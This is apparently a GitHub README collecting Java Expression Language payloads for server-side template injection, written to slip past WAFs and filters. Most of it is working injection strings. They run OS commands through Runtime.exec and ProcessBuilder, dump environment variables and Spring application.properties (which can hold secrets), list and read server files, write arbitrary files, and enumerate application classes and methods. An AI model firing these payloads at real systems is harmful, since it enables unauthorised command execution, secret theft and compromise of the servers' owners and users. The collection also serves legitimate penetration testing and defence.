# Java-EL-SSTI-Advanced
Advanced Expression Language payloads for Java based SSTI's

## Whats it about:
For some cases, regular SSTI EL payloads are not suitable, because of something like WAF, prohibition of file execution and etc, so u may not able to shot regular payloads such as:
```java
T(java.lang.Runtime).getRuntime().exec('calc')
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
```
(for more see on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#expression-language-el) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java))

You probably need to start think in another way and try gather and do as much as possible... 
So, this repository was born from payloads developed during a regular web application pentest and several others written out of boredom, feel free to push more!

## Environment and properties
```Java
T(java.lang.System).getenv().toString()
T(java.lang.System).getProperties().toString()
```
## Spring properties
```Java
T(org.springframework.core.io.support.PropertiesLoaderUtils).loadAllProperties("application.properties").toString()
"".getClass().forName("org.springframework.core.io.support.PropertiesLoaderUtils").getMethod("loadAllProperties","".getClass()).invoke("","application.properties").toString()
```

## Reading command output
```java
T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
```

## Listing files
```java
"".getClass().forName("java.io.File").getConstructor("".getClass()).newInstance("C:/Windows").listFiles()
```

## Read Files (Strings)
```java
// this one may not work beacuse of difference of java.nio.file.Paths.Get arguments from java to java
"".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke("","".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke("","",new String[]{"C:/Windows/System32/drivers/etc/hosts"}))
"".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/System32/drivers/etc/hosts")))
"".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
T(java.nio.file.Files).readAllLines("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
```

## Read Files (Bytes)
```java
// this one may not work beacuse of difference of java.nio.file.Paths.Get arguments from java to java
"".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke("","".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke("","",new String[]{"C:/Windows/System32/drivers/etc/hosts"}))
"".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/System32/drivers/etc/hosts")))
"".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
T(java.nio.file.Files).readAllBytes("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))

```

## Write Files (Strings)
```java
// not at uri "file:/" prefix
// change "hello" to your file content
"".getClass().forName("java.nio.file.Files").getMethod("write","".getClass().forName("java.nio.file.Path"),"".getClass().forName("[B"),"".getClass().forName("[Ljava.nio.file.OpenOption;")).invoke("","".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})

T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})

T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})

```

## List packages
```java
T(java.util.Arrays).toString("".getClass().forName("java.lang.Package").getMethod("getPackages").invoke(""))
"".getClass().forName("java.util.Arrays").getMethod("toString","".getClass().forName("[Ljava.lang.Object;") ).invoke("","".getClass().forName("java.lang.Package").getMethod("getPackages").invoke("")).toString()
```

## List classes/files of package
```java
// replace org/myapplication to your /org/custom/package
"".getClass().forName("java.io.File").getConstructor("".getClass().forName("java.lang.String")).newInstance("".getClass().forName("java.lang.Thread").currentThread().getContextClassLoader().getResource("org/myapplication").getFile()).listFiles()
```

## List properties of custom class
```java
// replace org.myapplication.User to your class
"".getClass().forName("java.util.Arrays").getMethod("toString", "".getClass().forName("[Ljava.lang.Object;")).invoke(null, new java.lang.Object[]{"".getClass().forName("org.myapplication.User").getDeclaredFields()}).toString()
```

## List all class methods
```java
// replace org.myapplication.User to your class
"".getClass().forName("java.util.Arrays").getMethod("toString","".getClass().forName("[Ljava.lang.Object;") ).invoke("",new java.lang.Object[]{"".getClass().forName("org.myapplication.User").getDeclaredMethods()})
```
